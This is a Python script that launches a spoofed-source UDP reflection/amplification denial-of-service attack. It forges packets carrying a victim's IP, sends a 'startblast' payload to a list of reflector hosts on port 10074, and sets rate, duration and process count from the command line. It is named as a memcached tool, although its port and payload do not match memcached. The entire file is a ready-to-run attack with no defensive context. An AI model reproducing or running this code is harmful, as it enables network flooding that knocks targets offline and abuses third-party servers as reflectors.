import sys
import random
import time
import multiprocessing
from scapy.all import IP, UDP, send, Raw
from colorama import Fore

# Load Bots list
with open("botmemcached.txt", "r") as f:
    bots = f.readlines()

# Payload
payload = "\x63\x61\x6c\x6c\x2e\x73\x74\x61\x72\x74\x62\x6c\x61\x73\x74\x20\x32\x30\x30\x30\x20\x33\x00"

def attack(target_ip, target_port, duration, rate_mbps):
    target = (target_ip, int(target_port))
    start_time = time.time()
    bytes_per_sec = rate_mbps * 1024 * 1024 / 8
    
    while time.time() - start_time < duration:
        server = random.choice(bots)
        server = server.strip()
        try:
            packet = (
                IP(dst=server, src=target_ip)
                / UDP(sport=int(target_port), dport=10074)
                / Raw(load=payload)
            )
            send(packet, verbose=False)
            time.sleep(len(packet) / bytes_per_sec)
        except Exception as e:
            print(
                f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Sent forged UDP packet from bot {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
            )

def send2attack(target_ip, target_port, duration, rate_mbps, num_processes):
    processes = []
    for _ in range(num_processes):
        mp = multiprocessing.Process(target=attack, args=(target_ip, target_port, duration, rate_mbps))
        mp.daemon = True  # Set daemon to True for automatic termination when the main program exits
        processes.append(mp)
        mp.start()

    for mp in processes:
        mp.join()

def main():
    if len(sys.argv) != 6:
        print("Usage: python3 memcached.py <target_ip> <target_port> <duration_in_seconds> <rate_mbps> <num_processes>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    duration = int(sys.argv[3])
    rate_mbps = float(sys.argv[4])
    num_processes = int(sys.argv[5])

    send2attack(target_ip, target_port, duration, rate_mbps, num_processes)

if __name__ == "__main__":
    main()
